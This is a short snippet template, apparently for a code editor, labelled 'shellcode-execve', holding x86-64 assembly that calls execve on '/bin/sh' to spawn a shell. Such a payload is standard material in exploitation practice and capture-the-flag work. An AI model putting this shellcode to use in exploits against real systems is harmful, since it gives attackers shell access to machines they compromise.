# HEADER
# name: execve(x64)
# prefix: shellcode-execve
# description: execve("/bin/sh", 0, 0)
# author: keymoon

# BODY
"""
mov eax, 59;
lea rdi, [rel s_binsh];
xor esi, esi;
xor edx, edx;
syscall;
s_binsh: db "/bin/sh", 0
"""
